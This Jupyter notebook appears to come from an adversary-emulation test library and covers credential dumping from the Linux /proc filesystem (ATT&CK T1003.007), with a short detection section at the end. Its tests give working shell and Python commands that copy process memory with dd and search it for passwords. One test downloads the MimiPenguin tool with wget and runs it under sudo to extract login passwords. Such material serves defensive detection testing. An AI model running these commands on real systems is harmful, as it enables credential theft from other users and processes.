{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "30f93587",
   "metadata": {},
   "source": "# T1003.007 - Proc Filesystem\nAdversaries may gather credentials from the proc filesystem or `/proc`. The proc filesystem is a pseudo-filesystem used as an interface to kernel data structures for Linux based systems managing virtual memory. For each process, the `/proc/<PID>/maps` file shows how memory is mapped within the process\u2019s virtual address space. And `/proc/<PID>/mem`, exposed for debugging purposes, provides access to the process\u2019s virtual address space.(Citation: Picus Labs Proc cump 2022)(Citation: baeldung Linux proc map 2022)\n\nWhen executing with root privileges, adversaries can search these memory locations for all processes on a system that contain patterns that are indicative of credentials, such as looking for fixed strings in memory structures or cached hashes. When running without privileged access, processes can still view their own virtual memory locations. Some services or programs may save credentials in clear text inside the process\u2019s memory.(Citation: MimiPenguin GitHub May 2017)(Citation: Polop Linux PrivEsc Gitbook)\n\nIf running as or with the permissions of a web browser, a process can search the `/maps` & `/mem` locations for common website credential patterns (that can also be used to find adjacent memory within the same structure) in which hashes or cleartext credentials may be located."
  },
  {
   "cell_type": "markdown",
   "id": "89365f36",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "c21895f1",
   "metadata": {},
   "source": "### Atomic Test #1 - Dump individual process memory with sh (Local)\nUsing `/proc/$PID/mem`, where $PID is the target process ID, use shell utilities to\ncopy process memory to an external file so it can be searched or exfiltrated later.\n\n**Supported Platforms:** linux\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `sh`!\n##### Description: Script to launch target process must exist\n\n##### Check Prereq Commands:\n```sh\ntest -f /tmp/T1003.007.sh\ngrep \"T1003.007\" /tmp/T1003.007.sh\n\n```\n##### Get Prereq Commands:\n```sh\necho '#!/bin/sh' > /tmp/T1003.007.sh\necho \"sh -c 'echo \\\"The password is T1003.007\\\" && sleep 30' &\" >> /tmp/T1003.007.sh\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ddcf1f4b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.007 -TestNumbers 1 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "f9160a63",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nsh /tmp/T1003.007.sh\nPID=$(pgrep -n -f \"T1003.007\")\nHEAP_MEM=$(grep -E \"^[0-9a-f-]* r\" /proc/\"$PID\"/maps | grep heap | cut -d' ' -f 1)\nMEM_START=$(echo $((0x$(echo \"$HEAP_MEM\" | cut -d\"-\" -f1))))\nMEM_STOP=$(echo $((0x$(echo \"$HEAP_MEM\" | cut -d\"-\" -f2))))\nMEM_SIZE=$(echo $((0x$MEM_STOP-0x$MEM_START)))\ndd if=/proc/\"${PID}\"/mem of=\"/tmp/T1003.007.bin\" ibs=1 skip=\"$MEM_START\" count=\"$MEM_SIZE\"\ngrep -i \"PASS\" \"/tmp/T1003.007.bin\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a1d3f72b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.007 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "31a6ac23",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrm -f \"/tmp/T1003.007.bin\"\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1dbfaa88",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.007 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "cb013098",
   "metadata": {},
   "source": "### Atomic Test #2 - Dump individual process memory with sh on FreeBSD (Local)\nUsing `/proc/$PID/mem`, where $PID is the target process ID, use shell utilities to\ncopy process memory to an external file so it can be searched or exfiltrated later.\nOn FreeBSD procfs must be mounted.\n\n**Supported Platforms:** linux\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `sh`!\n##### Description: Script to launch target process must exist\n\n##### Check Prereq Commands:\n```sh\ntest -f /tmp/T1003.007.sh\ngrep \"T1003.007\" /tmp/T1003.007.sh\n\n```\n##### Get Prereq Commands:\n```sh\necho '#!/bin/sh' > /tmp/T1003.007.sh\necho \"sh -c 'echo \\\"The password is T1003.007\\\" && sleep 30' &\" >> /tmp/T1003.007.sh\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9a1974da",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.007 -TestNumbers 2 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "15a60fbe",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nsh /tmp/T1003.007.sh\nPID=$(pgrep -n -f \"T1003.007\")\nMEM_START=$(head -n 5 /proc/\"${PID}\"/map | tail -1 | cut -d' ' -f1)\nMEM_STOP=$(head -n 5 /proc/\"${PID}\"/map | tail -1 | cut -d' ' -f2)\nMEM_SIZE=$(echo $(($MEM_STOP-$MEM_START)))\ndd if=/proc/\"${PID}\"/mem of=\"/tmp/T1003.007.bin\" ibs=1 skip=\"$MEM_START\" count=\"$MEM_SIZE\"\nstrings \"/tmp/T1003.007.bin\" | grep -i PASS\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "531d8bfa",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.007 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "3adc551f",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrm -f \"/tmp/T1003.007.bin\"\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "65e7ba90",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.007 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "368f9756",
   "metadata": {},
   "source": "### Atomic Test #3 - Dump individual process memory with Python (Local)\nUsing `/proc/$PID/mem`, where $PID is the target process ID, use a Python script to\ncopy a process's heap memory to an external file so it can be searched or exfiltrated later.\nOn FreeBSD procfs must be mounted.\n\n**Supported Platforms:** linux\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `sh`!\n##### Description: Script to launch target process must exist\n\n##### Check Prereq Commands:\n```sh\ntest -f /tmp/T1003.007.sh\ngrep \"T1003.007\" /tmp/T1003.007.sh\n\n```\n##### Get Prereq Commands:\n```sh\necho '#!/bin/sh' > /tmp/T1003.007.sh\necho \"sh -c 'echo \\\"The password is T1003.007\\\" && sleep 30' &\" >> /tmp/T1003.007.sh\n\n```\n##### Description: Requires Python\n\n##### Check Prereq Commands:\n```sh\n(which python || which python3 || which python2)\n\n```\n##### Get Prereq Commands:\n```sh\necho \"Python 2.7+ or 3.4+ must be installed\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "860c9abe",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.007 -TestNumbers 3 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "caafe0a3",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nsh /tmp/T1003.007.sh\nPID=$(pgrep -n -f \"T1003.007\")\nPYTHON=$(which python || which python3 || which python2)\n$PYTHON PathToAtomicsFolder/T1003.007/src/dump_heap.py $PID /tmp/T1003.007.bin\ngrep -i \"PASS\" \"/tmp/T1003.007.bin\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e5b29b60",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.007 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "8b29b5c5",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrm -f \"/tmp/T1003.007.bin\"\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e33bc9fc",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.007 -TestNumbers 3 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "3967d32c",
   "metadata": {},
   "source": "### Atomic Test #4 - Capture Passwords with MimiPenguin\nMimiPenguin is a tool inspired by MimiKatz that targets Linux systems affected by CVE-2018-20781 (Ubuntu-based distros and certain versions of GNOME Keyring). \nUpon successful execution on an affected system, MimiPenguin will retrieve passwords from memory and output them to a specified file. \nSee https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20781. \nSee https://www.tecmint.com/mimipenguin-hack-login-passwords-of-linux-users/#:~:text=Mimipenguin%20is%20a%20free%20and,tested%20on%20various%20Linux%20distributions.\n\n**Supported Platforms:** linux\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `sh`!\n##### Description: MimiPenguin script must exist on disk at specified location (#{MimiPenguin_Location})\n\n##### Check Prereq Commands:\n```bash\nif [ -f \"/tmp/mimipenguin/mimipenguin_2.0-release/mimipenguin.sh\" ]; then exit 0; else exit 1; fi;\n\n```\n##### Get Prereq Commands:\n```bash\nwget -O \"/tmp/mimipenguin.tar.gz\" https://github.com/huntergregal/mimipenguin/releases/download/2.0-release/mimipenguin_2.0-release.tar.gz\nmkdir /tmp/mimipenguin\ntar -xzvf \"/tmp/mimipenguin.tar.gz\" -C /tmp/mimipenguin\n\n```\n##### Description: Strings must be installed\n\n##### Check Prereq Commands:\n```bash\nif [ -x \"$(command -v strings --version)\" ]; then exit 0; else exit 1; fi;\n\n```\n##### Get Prereq Commands:\n```bash\nsudo apt-get -y install binutils\n\n```\n##### Description: Python2 must be installed\n\n##### Check Prereq Commands:\n```bash\nif [ -x \"$(command -v python2 --version)\" ]; then exit 0; else exit 1; fi;\n\n```\n##### Get Prereq Commands:\n```bash\nsudo apt-get -y install python2       \n\n```\n##### Description: Libc-bin must be installed\n\n##### Check Prereq Commands:\n```bash\nif [ -x \"$(command -v ldd --version)\" ]; then exit 0; else exit 1; fi;\n\n```\n##### Get Prereq Commands:\n```bash\nsudo apt-get -y install libc-bin        \n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c32f87a2",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.007 -TestNumbers 4 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "52753074",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `bash`\n",
    "```bash\nsudo /tmp/mimipenguin/mimipenguin_2.0-release/mimipenguin.sh > /tmp/T1003.007Test3.txt\ncat /tmp/T1003.007Test3.txt\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6dc9c9f8",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.007 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "f5bfeeab",
   "metadata": {},
   "source": "#### Cleanup: \n```bash\nrm -f /tmp/T1003.007Test3.txt > /dev/null\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "66828136",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.007 -TestNumbers 4 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "375698c2",
   "metadata": {},
   "source": "## Detection\nTo obtain the passwords and hashes stored in memory, processes must open a maps file in the /proc filesystem for the process being analyzed. This file is stored under the path <code>/proc/\\*/maps</code>, where the <code>\\*</code> directory is the unique pid of the program being interrogated for such authentication data. The AuditD monitoring tool, which ships stock in many Linux distributions, can be used to watch for hostile processes opening this file in the proc file system, alerting on the pid, process name, and arguments of such programs."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}